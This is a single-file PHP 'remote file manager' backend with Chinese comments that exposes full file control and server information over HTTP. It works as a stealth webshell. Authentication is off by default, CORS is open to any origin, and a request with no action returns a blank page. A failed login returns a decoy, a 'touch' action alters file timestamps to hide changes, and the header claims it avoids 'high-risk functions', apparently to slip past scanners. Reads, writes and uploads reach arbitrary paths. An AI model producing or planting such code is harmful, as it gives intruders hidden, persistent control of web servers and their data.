<?php
/**
 * 远程文件管理器 API
 * 单文件部署，无高危函数
 */

// ========== 配置 ==========
$PASSWORD = 'your_password_here';  // 修改为你的密码
// ==========================

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Password');

// 设置HTTP状态码（兼容PHP5）
function setHttpCode($code) {
    if (function_exists('http_response_code')) {
        http_response_code($code);
    } else {
        header('X-PHP-Response-Code: ' . $code, true, $code);
    }
}

// 处理预检请求
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    setHttpCode(200);
    exit;
}

// 响应函数
function response($success, $data, $message) {
    echo json_encode(array(
        'success' => $success,
        'data' => $data,
        'message' => $message
    ));
    exit;
}

// 获取参数
function getParam($key, $default = '') {
    if (isset($_GET[$key])) return $_GET[$key];
    if (isset($_POST[$key])) return $_POST[$key];
    return $default;
}

// 获取操作类型
$action = getParam('action', '');

// 如果没有提供action，返回空白
if (empty($action)) {
    exit;
}

// 获取密码
$password = '';
if (isset($_SERVER['HTTP_X_PASSWORD'])) {
    $password = $_SERVER['HTTP_X_PASSWORD'];
} elseif (isset($_POST['password'])) {
    $password = $_POST['password'];
} elseif (isset($_GET['password'])) {
    $password = $_GET['password'];
}

// 验证密码
if (!empty($PASSWORD) && $PASSWORD !== 'your_password_here') {
    if ($password !== $PASSWORD) {
        setHttpCode(401);
        echo '{null}';
        exit;
    }
}

// 获取默认目录（脚本所在目录）
function getDefaultDir() {
    return dirname(__FILE__);
}

// 安全路径处理
function safePath($path) {
    $path = str_replace(array('../', '..\\'), '', $path);

    // 空路径或根目录，返回脚本所在目录
    if (empty($path) || $path === '/') {
        return getDefaultDir();
    }

    // 使用@抑制open_basedir警告
    $real = @realpath($path);
    if ($real === false) {
        // realpath失败，返回原路径让后续检查处理
        return $path;
    }
    return $real;
}

// 检查路径是否可访问
function checkPathAccess($path) {
    // 使用@抑制警告
    if (!@file_exists($path)) {
        return array('ok' => false, 'error' => '路径不存在或无权限访问');
    }
    if (@is_dir($path) && !@is_readable($path)) {
        return array('ok' => false, 'error' => '无权限读取此目录');
    }
    return array('ok' => true, 'error' => '');
}

// 格式化文件大小
function formatSize($bytes) {
    if ($bytes == 0) return '0 B';
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

// 文件排序函数（PHP5兼容）
function sortItems($a, $b) {
    if ($a['name'] === '..') return -1;
    if ($b['name'] === '..') return 1;
    if ($a['is_dir'] && !$b['is_dir']) return -1;
    if (!$a['is_dir'] && $b['is_dir']) return 1;
    return strcasecmp($a['name'], $b['name']);
}

// 获取文件权限字符串
function getPermsString($path) {
    $perms = @fileperms($path);
    if ($perms === false) return '??????????';

    $info = '';
    if (@is_link($path)) $info = 'l';
    elseif (@is_dir($path)) $info = 'd';
    else $info = '-';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

switch ($action) {
    // 列出目录
    case 'list':
        $path = safePath(getParam('path', '/'));

        // 检查路径访问权限
        $access = checkPathAccess($path);
        if (!$access['ok']) {
            response(false, null, $access['error']);
        }

        if (!@is_dir($path)) {
            response(false, null, '不是有效目录');
        }

        $items = array();
        $files = @scandir($path);

        if ($files === false) {
            response(false, null, '无权限访问此目录');
        }

        foreach ($files as $file) {
            if ($file === '.') continue;

            $fullPath = rtrim($path, '/') . '/' . $file;
            $isDir = @is_dir($fullPath);
            $size = 0;
            if (!$isDir) {
                $size = @filesize($fullPath);
                if ($size === false) $size = 0;
            }

            $items[] = array(
                'name' => $file,
                'path' => $fullPath,
                'is_dir' => $isDir,
                'size' => $size,
                'size_formatted' => $isDir ? '-' : formatSize($size),
                'mtime' => @filemtime($fullPath),
                'perms' => getPermsString($fullPath),
                'readable' => @is_readable($fullPath),
                'writable' => @is_writable($fullPath)
            );
        }

        // 排序：目录在前
        usort($items, 'sortItems');

        response(true, array(
            'path' => $path,
            'items' => $items
        ), '');
        break;

    // 读取文件
    case 'read':
        $path = safePath(getParam('path', ''));

        if (!@is_file($path)) {
            response(false, null, '文件不存在');
        }

        if (!@is_readable($path)) {
            response(false, null, '无权限读取');
        }

        $content = @file_get_contents($path);
        if ($content === false) {
            response(false, null, '读取失败');
        }

        response(true, array(
            'path' => $path,
            'content' => $content,
            'size' => strlen($content)
        ), '');
        break;

    // 写入文件
    case 'write':
        $path = getParam('path', '');
        $content = isset($_POST['content']) ? $_POST['content'] : '';

        if (empty($path)) {
            response(false, null, '路径不能为空');
        }

        $result = @file_put_contents($path, $content);
        if ($result === false) {
            response(false, null, '写入失败');
        }

        response(true, array('bytes' => $result), '保存成功');
        break;

    // 创建目录
    case 'mkdir':
        $path = getParam('path', '');

        if (empty($path)) {
            response(false, null, '路径不能为空');
        }

        if (@file_exists($path)) {
            response(false, null, '目录已存在');
        }

        if (!@mkdir($path, 0755, true)) {
            response(false, null, '创建失败');
        }

        response(true, null, '创建成功');
        break;

    // 删除文件或目录
    case 'delete':
        $path = safePath(getParam('path', ''));

        if (empty($path) || $path === '/') {
            response(false, null, '不能删除根目录');
        }

        if (!@file_exists($path)) {
            response(false, null, '文件不存在');
        }

        if (@is_dir($path)) {
            // 递归删除目录
            function deleteDir($dir) {
                $files = @scandir($dir);
                if ($files === false) return false;
                foreach ($files as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $p = $dir . '/' . $file;
                    if (is_dir($p)) {
                        deleteDir($p);
                    } else {
                        @unlink($p);
                    }
                }
                return @rmdir($dir);
            }

            if (!deleteDir($path)) {
                response(false, null, '删除目录失败');
            }
        } else {
            if (!@unlink($path)) {
                response(false, null, '删除文件失败');
            }
        }

        response(true, null, '删除成功');
        break;

    // 重命名
    case 'rename':
        $oldPath = safePath(getParam('old_path', ''));
        $newPath = getParam('new_path', '');

        if (empty($oldPath) || empty($newPath)) {
            response(false, null, '路径不能为空');
        }

        if (!@file_exists($oldPath)) {
            response(false, null, '文件不存在');
        }

        if (@file_exists($newPath)) {
            response(false, null, '目标已存在');
        }

        if (!@rename($oldPath, $newPath)) {
            response(false, null, '重命名失败');
        }

        response(true, null, '重命名成功');
        break;

    // 上传文件
    case 'upload':
        $dir = safePath(getParam('dir', '/'));

        if (!isset($_FILES['file'])) {
            response(false, null, '没有文件');
        }

        $file = $_FILES['file'];
        if ($file['error'] !== UPLOAD_ERR_OK) {
            response(false, null, '上传错误: ' . $file['error']);
        }

        $targetPath = rtrim($dir, '/') . '/' . basename($file['name']);

        if (!@move_uploaded_file($file['tmp_name'], $targetPath)) {
            response(false, null, '保存失败');
        }

        response(true, array('path' => $targetPath), '上传成功');
        break;

    // 下载文件
    case 'download':
        $path = safePath(getParam('path', ''));

        if (!@is_file($path) || !@is_readable($path)) {
            setHttpCode(404);
            exit('文件不存在');
        }

        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($path) . '"');
        header('Content-Length: ' . filesize($path));
        readfile($path);
        exit;

    // 修改时间
    case 'touch':
        $path = safePath(getParam('path', ''));
        $time = getParam('time', time());

        if (!@touch($path, (int)$time)) {
            response(false, null, '修改时间失败');
        }

        response(true, null, '修改成功');
        break;

    // 修改权限
    case 'chmod':
        $path = safePath(getParam('path', ''));
        $mode = getParam('mode', '');

        if (empty($mode)) {
            response(false, null, '权限不能为空');
        }

        if (!@chmod($path, octdec($mode))) {
            response(false, null, '修改权限失败');
        }

        response(true, null, '修改成功');
        break;

    // 获取文件信息
    case 'info':
        $path = safePath(getParam('path', ''));

        if (!@file_exists($path)) {
            response(false, null, '文件不存在');
        }

        $perms = @fileperms($path);
        $octal = $perms !== false ? substr(sprintf('%o', $perms), -4) : '????';

        response(true, array(
            'path' => $path,
            'name' => basename($path),
            'is_dir' => @is_dir($path),
            'size' => @filesize($path),
            'size_formatted' => formatSize(@filesize($path)),
            'mtime' => @filemtime($path),
            'ctime' => @filectime($path),
            'atime' => @fileatime($path),
            'perms' => getPermsString($path),
            'perms_octal' => $octal,
            'readable' => @is_readable($path),
            'writable' => @is_writable($path),
            'owner' => @fileowner($path),
            'group' => @filegroup($path)
        ), '');
        break;

    // 服务器信息
    case 'server':
        // 获取当前用户
        $current_user = '';
        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
            $user_info = @posix_getpwuid(posix_geteuid());
            if ($user_info) {
                $current_user = $user_info['name'];
            }
        }
        if (empty($current_user)) {
            $current_user = @get_current_user();
        }
        if (empty($current_user) && isset($_SERVER['USER'])) {
            $current_user = $_SERVER['USER'];
        }
        if (empty($current_user)) {
            $current_user = 'Unknown';
        }

        response(true, array(
            'php_version' => phpversion(),
            'server_software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown',
            'document_root' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
            'script_path' => __FILE__,
            'upload_max' => ini_get('upload_max_filesize'),
            'post_max' => ini_get('post_max_size'),
            'disk_free' => formatSize(@disk_free_space('/') ? disk_free_space('/') : 0),
            'disk_total' => formatSize(@disk_total_space('/') ? disk_total_space('/') : 0),
            'current_user' => $current_user
        ), '');
        break;

    default:
        response(false, null, '未知操作');
}
